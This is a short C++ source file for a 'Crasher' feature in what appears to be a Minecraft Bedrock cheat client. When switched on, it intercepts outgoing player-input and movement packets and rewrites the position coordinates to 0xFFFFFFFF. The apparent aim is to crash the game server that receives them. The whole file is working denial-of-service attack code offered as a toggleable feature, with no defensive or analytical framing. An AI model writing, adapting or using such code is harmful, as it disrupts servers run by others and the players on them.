#include "Crasher.h"
#include "../Minecraft/Packet.h"
#include "../Minecraft/MovePlayerPacket.h"
#include "../Minecraft/PlayerAuthInputPacket.h"

namespace edu::features {

bool g_crasherEnabled = false;

void toggleCrasher() { g_crasherEnabled = !g_crasherEnabled; }

void processCrasher(void* packet, bool& shouldSend) {
    if (!g_crasherEnabled || !packet) return;

    auto& pkt = *static_cast<Packet*>(packet);
    uint32_t id = static_cast<uint32_t>(pkt.getId());

    if (id == PACKET_ID_PLAYER_AUTH_INPUT) {
        auto& paip = *reinterpret_cast<PlayerAuthInputPacket*>(&pkt);
        paip.mPos().x = 0xFFFFFFFF;
        paip.mPos().y = 0xFFFFFFFF;
        paip.mPos().z = 0xFFFFFFFF;
    } else if (id == PACKET_ID_MOVE_PLAYER) {
        auto& mpp = *reinterpret_cast<MovePlayerPacket*>(&pkt);
        mpp.mPos().x = 0xFFFFFFFF;
        mpp.mPos().y = 0xFFFFFFFF;
        mpp.mPos().z = 0xFFFFFFFF;
    }
}

} // namespace edu::features
